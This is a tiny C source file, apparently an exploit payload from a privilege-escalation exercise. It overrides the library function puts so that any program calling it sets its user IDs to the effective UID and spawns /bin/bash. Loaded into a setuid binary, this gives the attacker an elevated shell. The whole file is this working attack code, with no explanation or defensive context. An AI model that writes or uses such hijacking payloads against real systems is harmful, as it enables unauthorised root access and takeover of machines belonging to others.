#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int puts(const char *str){
	printf("%s", "Hi!");
	setresuid(geteuid(), geteuid(), geteuid());
	system("/bin/bash");
	return 1;
}

